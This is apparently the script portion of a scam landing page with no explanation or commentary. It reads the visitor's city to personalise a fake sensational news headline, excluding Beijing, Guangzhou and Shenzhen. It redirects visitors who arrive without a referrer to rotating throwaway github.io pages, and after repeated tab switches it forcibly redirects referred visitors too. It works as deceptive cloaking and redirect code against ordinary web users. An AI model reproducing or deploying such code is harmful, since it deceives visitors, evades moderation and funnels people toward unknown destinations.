    <script>
        function randomString(len) {
            len = len || 32;
            var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
            /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/
            var maxPos = $chars.length;
            var pwd = '';
            for (i = 0; i < len; i++) {
                pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
            }
            return pwd;
        }
    </script>

<script>
    var address = localAddress.city ? localAddress.city : "";
    var city = address.replace(/(.*)市/, '$1');
    city = city.replace("广州", "");
    city = city.replace("深圳", "");

    city = city.replace("北京", "");

</script>

<script>
    var items = ['https://ccbv39.github.io/index.html','https://rbtr30.github.io/index.html','https://zscb03.github.io/index.html'];
        var iindex = items[Math.floor(Math.random() * items.length)];
    if (!document.referrer) {
        
        data = iindex + "?" + randomString(98);
        location.href = data;
    } else {
        var tit = ["突发，40人寻衅滋事祸害一方，获利200万元"];
        var titi = tit[Math.floor(Math.random() * tit.length)];
        $("title").html(city + titi);//
        tNum = 1;
        qNum = 0;

        oosPath = "https://laowen-1.oss-cn-hangzhou.aliyuncs.com/video/img2/";
        $("body").css("background-image", "url(" + oosPath + (tNum + qNum) + ".png)");


        var hiddenProperty = 'hidden' in document ? 'hidden' :
            'webkitHidden' in document ? 'webkitHidden' :
                'mozHidden' in document ? 'mozHidden' :
                    null;
        var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
        var onVisibilityChange = function () {
            if (!document[hiddenProperty]) {
                window.show_time = Date.now();
                if (show_time - hidden_time > 1000) {
                    if (tNum > 6) {
                        qNum += 1;
                    } else {
                        tNum += 1;
                    }
                    if (qNum > 2) {
                        location.href = iindex+"?key=" + randomString(16) + "&jump=1";
                    }
                    show();

                }

            } else {
                window.hidden_time = Date.now();
            }
        };
        document.addEventListener(visibilityChangeEvent, onVisibilityChange);
    }

    function show() {
        if (tNum > 6) {
            $("body").css("background-image", "url(" + oosPath + (tNum + qNum - 1) + ".png)")
        } else {
            $("body").css("background-image", "url(" + oosPath + (tNum + qNum) + ".png)")
        }

    }


</script>
